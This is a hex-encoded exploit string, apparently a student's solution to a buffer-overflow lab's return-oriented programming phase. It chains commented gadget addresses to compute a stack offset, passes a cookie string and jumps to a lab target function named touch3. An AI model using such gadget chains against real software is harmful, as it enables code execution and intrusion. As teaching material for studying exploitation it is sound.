32 64 36 66 63 32 64 35 //string
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
9c 1a 40 00 00 00 00 00 //mov rsp,rax
b4 19 40 00 00 00 00 00 //movq rax, rdi
d7 19 40 00 00 00 00 00 //popq rax
50 00 00 00 00 00 00 00 //this stands for 80
89 1a 40 00 00 00 00 00 //movl eax,edx
8e 1a 40 00 00 00 00 00 //movl edx,ecx
ed 19 40 00 00 00 00 00 //movl ecx,esi
e7 19 40 00 00 00 00 00 //lea (rdi,rsi,1) rax == rdi+rsi = rax
dd 19 40 00 00 00 00 00 //movq rax,rdi
1c 19 40 00 00 00 00 00 //add touch 3
32 64 36 66 63 32 64 35


